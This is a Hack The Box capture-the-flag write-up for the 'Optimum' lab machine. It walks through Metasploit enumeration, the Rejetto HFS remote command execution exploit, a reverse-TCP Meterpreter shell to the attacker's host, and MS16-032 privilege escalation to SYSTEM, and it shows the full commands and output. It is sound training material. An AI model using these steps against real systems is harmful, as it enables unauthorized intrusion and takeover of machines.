---
layout: default
title: Hackthebox | Optimum
description: Collection of write ups for Hackthebox.
---
# HTB | Optimum
### Enumeration
Optimum is part of the Pwn With Metasploit track. 
So I will attempt to utilize Metasploit as much as possible.
Get start with your favorite NMAP scan.

```bash
msf6 > db_nmap 10.10.10.8 -sV -sC -A -Pn
[*] Nmap: Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-18 16:07 EDT
[*] Nmap: Nmap scan report for 10.10.10.8
[*] Nmap: Host is up (0.099s latency).
[*] Nmap: Not shown: 999 filtered tcp ports (no-response)
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/tcp open  http    HttpFileServer httpd 2.3
[*] Nmap: |_http-title: HFS /
[*] Nmap: |_http-server-header: HFS 2.3
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 23.35 seconds
```

We can check what type of info metasploit has harvested with the `hosts` and `services` commands.
Even though the nmap scan believes its windows, metasploit is not convinced we have enough info to populate `os_name`.
Looks like port 80 is open with an http service called HttpFileServer and its version is `2.3`.

```bash
msf6 > hosts

Hosts
=====

address     mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------     ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.8             Unknown                    device

msf6 > services
Services
========

host        port  proto  name  state  info
----        ----  -----  ----  -----  ----
10.10.10.8  80    tcp    http  open   HttpFileServer httpd 2.3
```


### Foothold

A quick `search` in Metasploit shows us a module that might give us access.
If you're interested in the `info` for the exploit, feel free to expand the collapsed details.

```bash
msf6 > search httpfileserver

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec
```

<details>
<summary>Rejetto HttpFileServer Info</summary>

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > info 0

       Name: Rejetto HttpFileServer Remote Command Execution
     Module: exploit/windows/http/rejetto_hfs_exec
   Platform: Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2014-09-11

Provided by:
  Daniele Linguaglossa <danielelinguaglossa@gmail.com>
  Muhamad Fadzil Ramli <mind1355@gmail.com>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  HTTPDELAY  10               no        Seconds to wait before terminating web server
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT      80               yes       The target port (TCP)
  SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
  SRVPORT    8080             yes       The local port to listen on.
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /                yes       The path of the web application
  URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host

Payload information:
  Avoid: 3 characters

Description:
  Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a
  poor regex in the file ParserLib.pas. This module exploits the HFS scripting commands by
  using '%00' to bypass the filtering. This module has been tested successfully on HFS 2.3b
  over Windows XP SP3, Windows 7 SP1 and Windows 8.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2014-6287
  OSVDB (111386)
  https://seclists.org/bugtraq/2014/Sep/85
  http://www.rejetto.com/wiki/index.php?title=HFS:_scripting_commands


View the full module info with the info -d command.
```
</details>

We'll go ahead and select the `rejetto_hfs_exec` module.
When dealing with 1 box, I typically use `setg` instead of `set` for values.
This will globally change the value in case a different module is used later.

```bash
msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > setg rhosts 10.10.10.8
rhosts => 10.10.10.8
msf6 exploit(windows/http/rejetto_hfs_exec) > setg lhost tun0
lhost => tun0

msf6 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.8       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


View the full module info with the info, or info -d command.
```

Now that all the required fields are populated, its time to `run` the exploit.

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.16.5:4444 
[*] Using URL: http://10.10.16.5:8080/6j5J6Gn
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /6j5J6Gn
[*] Sending stage (175686 bytes) to 10.10.10.8
[!] Tried to delete %TEMP%\LMTBVYmFz.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.16.5:4444 -> 10.10.10.8:49162) at 2023-08-18 16:16:39 -0400
[*] Server stopped.

meterpreter > 
```


### User Flag
Looks like this application is indeed vulnerable to the `rejetto_hfs_exec` exploit.
Time to look at what user we are and what's in our initial directory.
There's the first flag.

> Note: Most of the time, new users will use the `shell` command when they get a meterpreter shell. I will intentially not be doing that to see how much functionality we can leverage from meterpreter.

```bash
meterpreter > getuid 
Server username: OPTIMUM\kostas

meterpreter > ls
Listing: C:\Users\kostas\Desktop
================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2023-08-25 01:14:43 -0400  %TEMP%
100666/rw-rw-rw-  282     fil   2017-03-18 07:57:16 -0400  desktop.ini
100777/rwxrwxrwx  760320  fil   2017-03-18 08:11:17 -0400  hfs.exe
100444/r--r--r--  34      fil   2023-08-25 01:02:31 -0400  user.txt

meterpreter > cat user.txt
<gEtHeReYoUrSeLf>
```

### Privilege Escalation / System Rights

After going through the Metasploit module in HTB Academy, I learned about the `local_exploit_suggester` module.
Once an attacker has a meterpreter shell, they can background it and use it as a pivot point.

We'll start by using `bg` to background meterpreter.
We can see active sessions with the `session` command.

```bash
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(windows/http/rejetto_hfs_exec) > sessions 

Active sessions
===============

  Id  Name  Type                     Information               Connection
  --  ----  ----                     -----------               ----------
  1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.16.5:4444 -> 10.10.10.8:49162 (10.10.10.8)
```

Next, we'll search for the `local_exploit_suggester` module and use our session as the pivot point.

```bash

msf6 exploit(windows/http/rejetto_hfs_exec) > msf6 post(multi/recon/local_exploit_suggester) > search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(windows/http/rejetto_hfs_exec) > use 0

msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > setg session 1
session => 1
```

Now its time to `run` it and what it collect potiential vulnerabilities for us.
If you'd like to see the output for the Suggester's `run`, its collapsed below.


<details>
<summary>Suggester Output</summary>

```bash
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 186 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.8 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.8 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
 4   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
```
</details>


Looks like we have 5 options to choose from.
After some trial and error, it appears to be vulnerable to `ms16_032_secondary_logon_handle_privesc` exploit.
There's quite a bit of info that populates the screen.
Because of this, I've taken the begining and end of the output.
```bash
[*] Started reverse TCP handler on 10.10.16.5:4444 
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\FGOUYkFK.ps1...
[*] Compressing script contents...
[+] Compressed size: 3741
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

<- SNIP ->

[+] Executed on target machine.
[*] Sending stage (175686 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.16.5:4444 -> 10.10.10.8:49163) at 2023-08-18 16:38:56 -0400
[+] Deleted C:\Users\kostas\AppData\Local\Temp\FGOUYkFK.ps1

meterpreter > 
```

Before continuing, its nice to see how Metasploit handles multiple sessions.
Again, we can take a look at all active sessions with the `session` command.
We get some nice information such as what user is active on that session and connection information.

```bash
meterpreter > bg
[*] Backgrounding session 2...
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM       10.10.16.5:4444 -> 10.10.10.8:49162 (10.10.10.8)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ OPTIMUM  10.10.16.5:4444 -> 10.10.10.8:49163 (10.10.10.8)

msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > 
```

Lets bring our newest session back to the foreground and check the user.

```bash
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > sessions 2
[*] Starting interaction with 2...

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

Looks like we have `system` rights.
Lets try them out.

```bash
meterpreter > ls C:/Users/Administrator/Desktop/
Listing: C:/Users/Administrator/Desktop/
========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-03-18 07:52:56 -0400  desktop.ini
100444/r--r--r--  34    fil   2023-08-25 01:02:31 -0400  root.txt

meterpreter > cat C:/Users/Administrator/Desktop/root.txt
<gEtHeReYoUrSeLf>
```

Congratulation, we've completed the box using Metasploit.
Hopefully, you've picked something up along the way.
Feel free to drop a message if you enjoyed this tutorial or if you think there's some places that could use improvement.

